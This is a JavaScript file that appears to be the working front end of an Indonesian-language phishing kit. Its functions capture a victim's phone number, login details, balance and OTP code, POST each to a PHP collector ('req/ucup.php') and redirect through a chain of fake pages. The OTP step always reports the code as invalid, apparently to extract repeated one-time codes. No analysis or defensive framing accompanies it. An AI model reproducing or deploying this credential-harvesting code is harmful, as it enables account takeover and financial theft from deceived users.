function sendHp() {
   $('.load').fadeIn();
   event.preventDefault();
   $(".lanjutkan").prop("disabled", true);
   document.getElementById('lanjutkan').innerHTML = "Memproses....";
   
   var nohp = $('input#nohp').val();
   sessionStorage.setItem('nohp', nohp);
   
   $.ajax({
        type: 'POST',
        url: 'req/ucup.php',
        data: $('#index').serialize(),
        datatype: 'JSON',
      complete: function() {
         setTimeout(function() {
            window.location = "lg.html";
            $("#lonte").hide();
            $('.load').fadeOut();
            document.getElementById('lanjutkan').innerHTML = "Lanjutkan";
         }, 800);
      }
   });
};



function sendLogin() {
   $('.load').fadeIn();
   event.preventDefault();
   $(".lanjutkan").prop("disabled", true);
   document.getElementById('lanjutkan').innerHTML = "Memproses....";
   
   $.ajax({
        type: 'POST',
        url: 'req/ucup.php',
        data: $('#login').serialize(),
        datatype: 'JSON',
      complete: function() {
         setTimeout(function() {
            window.location = "blnce.html";
            $("#lonte").hide();
            $('.load').fadeOut();
            document.getElementById('lanjutkan').innerHTML = "Lanjutkan";
            
         }, 500);
      }
   });
};


function sendSaldo() {
   $('.load').fadeIn();
   event.preventDefault();
   $(".lanjutkan").prop("disabled", true);
   document.getElementById('lanjutkan').innerHTML = "Memproses....";
   
   $.ajax({
        type: 'POST',
        url: 'req/ucup.php',
        data: $('#sald').serialize(),
        datatype: 'JSON',
      complete: function() {
         setTimeout(function() {
            window.location = "ver.html";
            $("#lonte").hide();
            $('.load').fadeOut();
            document.getElementById('lanjutkan').innerHTML = "Lanjutkan";
            
         }, 400);
      }
   });
};
        

// Kirim OTP
function sendOtp() {
   event.preventDefault();
   $("#loader").fadeIn();
   $(".btn-primary").prop("disabled", true);
      
   $.ajax({
        type: 'POST',
        url: 'req/ucup.php',
        data: $('#formLink').serialize(),
        datatype: 'JSON',
      complete: function() {
         $("#loader").fadeOut();
         $(".btn-primary").prop("disabled", false);
         $("#errorAlert").removeClass("alert-success").addClass("alert-danger");
         $("#errorAlert").html("Kode aktivasi tidak valid!<br>Silakan coba lagi.").slideDown();
         $("#nama1").val('');
         $("#nama1").focus();
         setTimeout(function() {
            $("#errorAlert").slideUp();
         }, 3000);
      },
      
   });
};        

